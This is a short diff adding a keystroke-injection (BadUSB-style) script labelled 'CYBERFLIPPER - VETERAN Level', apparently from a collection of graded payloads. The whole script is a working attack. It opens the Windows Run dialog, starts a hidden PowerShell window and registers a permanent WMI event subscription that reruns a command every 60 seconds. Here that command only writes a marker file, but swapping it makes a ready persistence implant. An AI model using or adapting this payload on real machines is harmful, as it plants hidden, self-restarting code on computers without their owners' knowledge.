@@ -1,0 +1,7 @@
+REM CYBERFLIPPER - VETERAN Level
+REM WMI Persistence - Permanent event subscription
+DELAY 300
+GUI r
+DELAY 200
+STRING powershell -W Hidden -C "$f=Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='CF';EventNamespace='root\cimv2';QueryLanguage='WQL';Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'};$c=Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='CFC';CommandLineTemplate='echo CF > %TEMP%\wmi.txt'};Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}"
+ENTER
